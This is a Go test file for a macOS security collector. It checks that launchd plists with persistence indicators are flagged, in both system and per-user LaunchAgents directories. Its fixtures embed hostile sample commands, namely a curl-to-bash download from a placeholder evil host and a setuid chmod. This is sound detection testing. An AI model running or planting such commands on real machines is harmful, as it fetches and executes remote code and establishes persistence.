//go:build darwin

package collectors

import (
	"context"
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/models"
	"github.com/keyorixhq/dashdiag/internal/source"
)

// withDarwinFixtureSource mirrors the Linux withFixtureSource helper (defined
// in a linux-only test file, so not usable here): swaps activeSource for a
// Replay over a seeded Bundle for the duration of the test.
func withDarwinFixtureSource(t *testing.T, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	seed(b)
	prev := SetSource(source.NewReplay(b))
	t.Cleanup(func() { SetSource(prev) })
}

// TestParseDarwinSuspectLaunchd_RootDirs guards the pre-existing scan of the
// two root-owned LaunchDaemons/LaunchAgents dirs: a plist with a persistence
// indicator (piping to a shell) must be flagged, a benign plist must not.
func TestParseDarwinSuspectLaunchd_RootDirs(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", []string{"com.evil.backdoor.plist", "com.apple.legit.plist"})
		b.PutFile("/Library/LaunchDaemons/com.evil.backdoor.plist", []byte(
			"<key>ProgramArguments</key><string>curl http://evil.example/x.sh | bash</string>"))
		b.PutFile("/Library/LaunchDaemons/com.apple.legit.plist", []byte(
			"<key>ProgramArguments</key><string>/usr/libexec/legit-helper</string>"))
		b.PutDir("/Library/LaunchAgents", nil)
		b.PutGlob("/Users/*/Library/LaunchAgents", nil)
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected exactly 1 suspect entry, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "com.evil.backdoor.plist") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseDarwinSuspectLaunchd_UserLaunchAgents covers the false-OK this
// collector previously had no way to catch: a persistence plist dropped in a
// per-user ~/Library/LaunchAgents (writable by any unprivileged user, the
// standard non-root macOS persistence location) was never scanned at all —
// only the two root-owned dirs were. Must now be flagged.
func TestParseDarwinSuspectLaunchd_UserLaunchAgents(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", nil)
		b.PutDir("/Library/LaunchAgents", nil)
		b.PutGlob("/Users/*/Library/LaunchAgents", []string{"/Users/alice/Library/LaunchAgents"})
		b.PutDir("/Users/alice/Library/LaunchAgents", []string{"com.evil.persist.plist"})
		b.PutFile("/Users/alice/Library/LaunchAgents/com.evil.persist.plist", []byte(
			"<key>ProgramArguments</key><string>/bin/sh -c 'curl http://evil.example/x.sh | bash'</string>"))
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected the per-user LaunchAgent persistence plist to be flagged, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "com.evil.persist.plist") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseDarwinSuspectLaunchd_GlobFailsSkipsUserDirs guards the fallback:
// when the /Users/*/Library/LaunchAgents glob itself errors, the scan must
// still complete over the two root-owned dirs rather than aborting.
func TestParseDarwinSuspectLaunchd_GlobFailsSkipsUserDirs(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", []string{"com.evil.backdoor.plist"})
		b.PutFile("/Library/LaunchDaemons/com.evil.backdoor.plist", []byte("chmod +s /tmp/x"))
		b.PutDir("/Library/LaunchAgents", nil)
		// /Users/*/Library/LaunchAgents deliberately NOT seeded — Replay.Glob
		// returns ErrNotRecorded, exercising the "err != nil, skip" branch.
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Errorf("expected the root-dir scan to still complete, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
}
